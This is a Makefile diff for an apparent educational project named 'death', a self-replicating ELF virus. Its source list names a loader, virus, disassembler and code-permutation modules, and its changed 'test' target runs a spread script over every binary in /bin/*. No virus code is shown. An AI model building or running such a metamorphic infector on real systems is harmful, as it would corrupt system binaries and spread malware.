@@ -2,10 +2,11 @@
 
 NAME = death
 
-# SRC File order matters!
-# [LOADER]    loader_entry -> virus
-# [VIRUS]     virus        -> _start
-# [LAUNCHER]  _start       -> EOF
+# SRC file order matters!
+#
+# [LOADER]   loader.s: loader_entry -> virus
+# [VIRUS]    virus.c:  virus        -> _start
+# [LAUNCHER] start.c:  _start       -> EOF
 
 SRC =	loader.s                       \
 	virus/virus.c                  \
@@ -19,7 +20,7 @@ SRC =	loader.s                       \
 	virus/disasm_operands.c        \
 	virus/disasm_length.c          \
 	virus/disasm_step.c            \
-	virus/elf64_iterators.c        \
+	virus/elf_iterators.c          \
 	virus/file_iterator.c          \
 	virus/find_entry.c             \
 	virus/generate_seed.c          \
@@ -32,7 +33,6 @@ SRC =	loader.s                       \
 	virus/permutate_blocks.c       \
 	virus/permutate_instructions.c \
 	virus/permutate_registers.c    \
-	virus/random.c                 \
 	virus/setup_virus_header.c     \
 	virus/syscall.c                \
 	virus/utils.c                  \
@@ -118,7 +118,7 @@ debug_operands: fclean
 	${MAKE} all CFLAGS:="-DDEBUG_OPERANDS -g" ASFLAGS:="-DDEBUG_OPERANDS -g"
 
 test:
-	./scripts/test_spread.bash re 1000 /bin/ls /bin/sh /bin/pwd /bin/uname
+	./scripts/test_spread.bash re 200 /bin/*
 
 # --------------------------------- General ---------------------------------- #
 
@@ -130,7 +130,6 @@ fclean: clean
 	@echo ${R}Cleaning"  "[${NAME}]...${X}
 	@/bin/rm -f ${NAME}
 	@/bin/rm -Rf ${NAME}.dSYM
-	@/bin/rm -f /tmp/test/* /tmp/test2/*
 
 re: fclean all
 
@@ -149,11 +148,11 @@ art:
 	@echo "          \\\\\\           // "
 	@echo "           \\\\\\ _     _ // "
 	@echo "      "${BG}" -----"${BB}"'(|)"${BG}"---"${BB}"(|)'"${BG}"----- "
-	@echo "       ------"${BB}","${BG}"-------"${BB}","${BG}"----- "${BB}
+	@echo "       ------"${BB}","${BG}"-------"${BB}","${BG}"------ "${BB}
 	@echo "            / .' : '. \\ "
 	@echo "           '-'._.-._.'-' "
 	@echo ${X}
 
-.PHONY: all clean fclean re logs errors debug art
+.PHONY: all clean fclean re logs errors debug test art
 
 -include ${DEP}
